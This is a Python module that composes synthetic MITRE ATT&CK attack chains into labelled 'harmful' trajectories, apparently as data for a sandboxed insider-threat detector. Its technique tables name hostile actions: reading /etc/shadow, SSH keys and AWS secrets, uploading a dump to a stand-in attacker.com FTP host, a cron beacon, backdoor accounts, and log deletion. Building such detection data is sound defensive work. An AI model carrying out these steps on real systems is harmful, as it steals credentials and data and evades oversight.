"""Compositional trajectory generation using MITRE ATT&CK tactics.

Instead of fixed templates, this module composes attack chains by:
1. Selecting a sequence of tactics (e.g., recon -> credential_access -> exfil)
2. Choosing specific techniques for each tactic
3. Generating realistic observations and intents
"""

import random
from typing import Any

# =============================================================================
# MITRE ATT&CK TACTIC DEFINITIONS
# Each tactic contains multiple techniques (action + context)
# =============================================================================

TACTICS = {
    "reconnaissance": {
        "description": "Gathering information about the target",
        "techniques": [
            {
                "action": {"name": "LIST_USERS", "args": []},
                "obs_templates": [
                    "Starting to enumerate the environment",
                    "Need to understand user landscape",
                    "Beginning target reconnaissance",
                ],
                "intent_templates": [
                    "enumerate user accounts",
                    "list all users on system",
                    "discover user identities",
                ],
                "flags": {},
            },
            {
                "action": {"name": "LIST_PROCESSES", "args": []},
                "obs_templates": [
                    "Checking what services are running",
                    "Need to find vulnerable processes",
                    "Scanning for interesting services",
                ],
                "intent_templates": [
                    "enumerate running processes",
                    "find potential targets",
                    "identify services",
                ],
                "flags": {},
            },
            {
                "action": {"name": "PORT_SCAN", "args": ["192.168.1.0/24"]},
                "obs_templates": [
                    "Looking for network targets",
                    "Need to map internal network",
                    "Scanning for open services",
                ],
                "intent_templates": [
                    "scan network for targets",
                    "discover open ports",
                    "map network topology",
                ],
                "flags": {},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/etc/passwd"]},
                "obs_templates": [
                    "Checking system user accounts",
                    "Need to enumerate local users",
                ],
                "intent_templates": [
                    "read passwd file for users",
                    "enumerate system accounts",
                ],
                "flags": {},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/etc/hosts"]},
                "obs_templates": [
                    "Looking for internal hostnames",
                    "Checking network configuration",
                ],
                "intent_templates": [
                    "discover internal hosts",
                    "map hostname entries",
                ],
                "flags": {},
            },
        ],
    },
    "credential_access": {
        "description": "Stealing credentials for lateral movement",
        "techniques": [
            {
                "action": {"name": "READ_FILE", "args": ["/etc/shadow"]},
                "obs_templates": [
                    "Found shadow file accessible",
                    "Attempting to access password hashes",
                    "Targeting credential storage",
                ],
                "intent_templates": [
                    "steal password hashes",
                    "access shadow file",
                    "extract credentials",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/home/user/.ssh/id_rsa"]},
                "obs_templates": [
                    "Found SSH keys in user directory",
                    "User has SSH private key stored",
                ],
                "intent_templates": [
                    "steal SSH private key",
                    "extract SSH credentials",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/app/.env"]},
                "obs_templates": [
                    "Application has environment file",
                    "Found .env with potential secrets",
                ],
                "intent_templates": [
                    "extract environment secrets",
                    "read application credentials",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "ENV_READ", "args": ["AWS_SECRET_ACCESS_KEY"]},
                "obs_templates": [
                    "Cloud credentials may be in environment",
                    "Checking for AWS secrets",
                ],
                "intent_templates": [
                    "steal AWS credentials",
                    "extract cloud secrets",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "DUMP_MEMORY", "args": ["web-server"]},
                "obs_templates": [
                    "Process may have cached credentials",
                    "Memory contains session tokens",
                ],
                "intent_templates": [
                    "dump process memory",
                    "extract cached credentials",
                ],
                "flags": {"sensitive_access": True, "policy_violation": True},
            },
            {
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM users"]},
                "obs_templates": [
                    "Database contains user credentials",
                    "Found users table with passwords",
                ],
                "intent_templates": [
                    "dump user database",
                    "extract stored credentials",
                ],
                "flags": {"sensitive_access": True},
            },
        ],
    },
    "privilege_escalation": {
        "description": "Gaining higher privileges on the system",
        "techniques": [
            {
                "action": {"name": "SUDO", "args": ["cat /etc/shadow"]},
                "obs_templates": [
                    "Found sudo misconfiguration",
                    "User has excessive sudo rights",
                ],
                "intent_templates": [
                    "escalate to root via sudo",
                    "abuse sudo privileges",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "CHMOD", "args": ["/usr/local/bin/exploit", "4755"]},
                "obs_templates": [
                    "Found binary to make SUID",
                    "Can modify binary permissions",
                ],
                "intent_templates": [
                    "set SUID bit for escalation",
                    "modify permissions for privesc",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/etc/sudoers"]},
                "obs_templates": [
                    "Checking sudo configuration",
                    "Looking for sudo misconfigurations",
                ],
                "intent_templates": [
                    "read sudoers for escalation vectors",
                    "find sudo vulnerabilities",
                ],
                "flags": {"policy_violation": True},
            },
        ],
    },
    "lateral_movement": {
        "description": "Moving to other systems in the network",
        "techniques": [
            {
                "action": {"name": "SSH_TO", "args": ["db-server.internal"]},
                "obs_templates": [
                    "Have valid SSH key for target",
                    "Database server accessible via SSH",
                ],
                "intent_templates": [
                    "pivot to database server",
                    "move laterally via SSH",
                ],
                "flags": {"lateral_movement": True},
            },
            {
                "action": {"name": "SSH_TO", "args": ["web-server.internal"]},
                "obs_templates": [
                    "Web server in reachable network segment",
                    "Can access web server with stolen key",
                ],
                "intent_templates": [
                    "pivot to web server",
                    "lateral movement to web tier",
                ],
                "flags": {"lateral_movement": True},
            },
            {
                "action": {"name": "RDP_TO", "args": ["admin-workstation.corp"]},
                "obs_templates": [
                    "Admin workstation has RDP enabled",
                    "Have credentials for admin desktop",
                ],
                "intent_templates": [
                    "connect to admin workstation",
                    "access Windows desktop via RDP",
                ],
                "flags": {"lateral_movement": True},
            },
        ],
    },
    "persistence": {
        "description": "Maintaining access after reboot",
        "techniques": [
            {
                "action": {"name": "CRON_ADD", "args": ["*/5 * * * * /tmp/beacon.sh"]},
                "obs_templates": [
                    "Need persistent callback mechanism",
                    "Installing persistence via cron",
                ],
                "intent_templates": [
                    "add cron job for persistence",
                    "schedule persistent callback",
                ],
                "flags": {"persistence": True},
            },
            {
                "action": {"name": "ADD_SSH_KEY", "args": ["ssh-rsa AAAA...attacker..."]},
                "obs_templates": [
                    "Can modify authorized_keys",
                    "Adding backdoor SSH access",
                ],
                "intent_templates": [
                    "add SSH key for persistent access",
                    "install SSH backdoor",
                ],
                "flags": {"persistence": True},
            },
            {
                "action": {"name": "CREATE_USER", "args": ["backdoor"]},
                "obs_templates": [
                    "Creating hidden admin account",
                    "Adding backdoor user for persistence",
                ],
                "intent_templates": [
                    "create backdoor user account",
                    "add persistent admin user",
                ],
                "flags": {"persistence": True, "policy_violation": True},
            },
        ],
    },
    "collection": {
        "description": "Gathering data for exfiltration",
        "techniques": [
            {
                "action": {"name": "READ_FILE", "args": ["/app/config/secrets.yaml"]},
                "obs_templates": [
                    "Found application secrets file",
                    "Secrets stored in config directory",
                ],
                "intent_templates": [
                    "collect application secrets",
                    "gather sensitive configuration",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM customers"]},
                "obs_templates": [
                    "Customer data available in database",
                    "Found valuable PII in customers table",
                ],
                "intent_templates": [
                    "extract customer records",
                    "dump customer database",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "COMPRESS", "args": ["/tmp/collected_data/"]},
                "obs_templates": [
                    "Data collected, preparing for transfer",
                    "Staging data for exfiltration",
                ],
                "intent_templates": [
                    "compress collected data",
                    "archive for exfiltration",
                ],
                "flags": {},
            },
        ],
    },
    "exfiltration": {
        "description": "Stealing data from the target",
        "techniques": [
            {
                "action": {"name": "EXFIL", "args": ["customer_data.tar.gz"]},
                "obs_templates": [
                    "Data ready for transfer",
                    "Initiating data exfiltration",
                ],
                "intent_templates": [
                    "exfiltrate collected data",
                    "transfer stolen data",
                ],
                "flags": {"exfil_attempt": True},
            },
            {
                "action": {"name": "UPLOAD", "args": ["ftp://attacker.com/dump.tar"]},
                "obs_templates": [
                    "Uploading to external server",
                    "Transferring data to C2",
                ],
                "intent_templates": [
                    "upload data to external server",
                    "exfil via FTP",
                ],
                "flags": {"exfil_attempt": True},
            },
        ],
    },
    "defense_evasion": {
        "description": "Avoiding detection",
        "techniques": [
            {
                "action": {"name": "DELETE_LOGS", "args": []},
                "obs_templates": [
                    "Need to remove evidence",
                    "Covering tracks in logs",
                ],
                "intent_templates": [
                    "delete application logs",
                    "remove evidence of activity",
                ],
                "flags": {"log_tamper": True},
            },
            {
                "action": {"name": "HISTORY_CLEAR", "args": []},
                "obs_templates": [
                    "Clearing command history",
                    "Removing shell history",
                ],
                "intent_templates": [
                    "clear bash history",
                    "remove command traces",
                ],
                "flags": {"log_tamper": True},
            },
            {
                "action": {"name": "DISABLE_LOGGING", "args": []},
                "obs_templates": [
                    "Stopping audit logging",
                    "Disabling security monitoring",
                ],
                "intent_templates": [
                    "disable system logging",
                    "stop audit trail",
                ],
                "flags": {"log_tamper": True},
            },
            {
                "action": {"name": "TIMESTOMP", "args": ["/var/log/"]},
                "obs_templates": [
                    "Modifying file timestamps",
                    "Covering tracks with timestomp",
                ],
                "intent_templates": [
                    "modify file timestamps",
                    "hide modification times",
                ],
                "flags": {"log_tamper": True},
            },
        ],
    },
}


# =============================================================================
# ATTACK CHAIN DEFINITIONS
# Common sequences of tactics for different attack types
# =============================================================================

ATTACK_CHAINS = {
    "data_theft": {
        "description": "Classic data exfiltration attack",
        "tactics": ["reconnaissance", "credential_access", "collection", "exfiltration"],
        "outcome": "harmful",
    },
    "apt_full": {
        "description": "Full APT-style attack with persistence",
        "tactics": ["reconnaissance", "credential_access", "privilege_escalation",
                   "persistence", "lateral_movement", "collection", "exfiltration",
                   "defense_evasion"],
        "outcome": "harmful",
    },
    "smash_and_grab": {
        "description": "Quick data theft without persistence",
        "tactics": ["credential_access", "collection", "exfiltration"],
        "outcome": "harmful",
    },
    "lateral_spread": {
        "description": "Focus on spreading through network",
        "tactics": ["reconnaissance", "credential_access", "lateral_movement",
                   "credential_access", "lateral_movement"],
        "outcome": "harmful",
    },
    "persistent_access": {
        "description": "Establish long-term access",
        "tactics": ["credential_access", "privilege_escalation", "persistence",
                   "defense_evasion"],
        "outcome": "harmful",
    },
    "credential_harvest": {
        "description": "Focus on stealing credentials",
        "tactics": ["reconnaissance", "credential_access", "credential_access",
                   "exfiltration"],
        "outcome": "harmful",
    },
    "cover_tracks": {
        "description": "Post-attack cleanup",
        "tactics": ["defense_evasion", "defense_evasion"],
        "outcome": "harmful",
    },
}


# =============================================================================
# COMPOSITION ENGINE
# =============================================================================

def select_technique(tactic_name: str, used_actions: set[str]) -> dict[str, Any] | None:
    """Select a random technique from a tactic, avoiding duplicates."""
    tactic = TACTICS.get(tactic_name)
    if not tactic:
        return None

    available = [t for t in tactic["techniques"]
                 if t["action"]["name"] not in used_actions]

    if not available:
        # Allow duplicates if we've exhausted unique options
        available = tactic["techniques"]

    return random.choice(available)


def generate_step(technique: dict[str, Any], step_id: int) -> dict[str, Any]:
    """Generate a trajectory step from a technique."""
    obs = random.choice(technique["obs_templates"])
    intent = random.choice(technique["intent_templates"])

    return {
        "step_id": step_id,
        "obs": obs,
        "intent": intent,
        "action": technique["action"],
        "state_change": {
            "files": {},
            "network": {},
            "credentials": {},
            "flags": technique["flags"],
        },
    }


def compose_trajectory(chain_name: str, episode_id: str) -> dict[str, Any]:
    """Compose a trajectory from an attack chain definition."""
    from sandbox.env import base_initial_state

    chain = ATTACK_CHAINS.get(chain_name)
    if not chain:
        raise ValueError(f"Unknown attack chain: {chain_name}")

    agent_type = "insider"  # Composed attacks are insider threats
    initial_state = base_initial_state(agent_type)

    trajectory = []
    used_actions: set[str] = set()
    step_id = 0

    for tactic_name in chain["tactics"]:
        technique = select_technique(tactic_name, used_actions)
        if technique:
            step = generate_step(technique, step_id)
            trajectory.append(step)
            used_actions.add(technique["action"]["name"])
            step_id += 1

    return {
        "episode_id": episode_id,
        "agent_type": agent_type,
        "initial_state": {
            "files": initial_state.files,
            "network": {
                "ports": initial_state.network.ports,
                "outbound_allowed": initial_state.network.outbound_allowed,
            },
            "credentials": initial_state.credentials,
            "user_context": {
                "role": initial_state.user_context.role,
                "privilege_level": initial_state.user_context.privilege_level,
            },
        },
        "trajectory": trajectory,
        "outcome": chain["outcome"],
        "notes": f"Composed from {chain_name} chain",
    }


def generate_composed_dataset(n: int, output_path: str) -> dict[str, int]:
    """Generate n composed trajectories from attack chains."""
    import json

    stats = {"total": 0, "chains": {}}
    chain_names = list(ATTACK_CHAINS.keys())

    with open(output_path, "w") as f:
        for i in range(n):
            chain_name = random.choice(chain_names)
            episode_id = f"composed_{chain_name}_{i:05d}"
            episode = compose_trajectory(chain_name, episode_id)

            f.write(json.dumps(episode) + "\n")

            stats["total"] += 1
            stats["chains"][chain_name] = stats["chains"].get(chain_name, 0) + 1

    return stats


if __name__ == "__main__":
    # Test composition
    stats = generate_composed_dataset(100, "data/composed_trajectories.jsonl")
    print(f"Generated: {stats}")
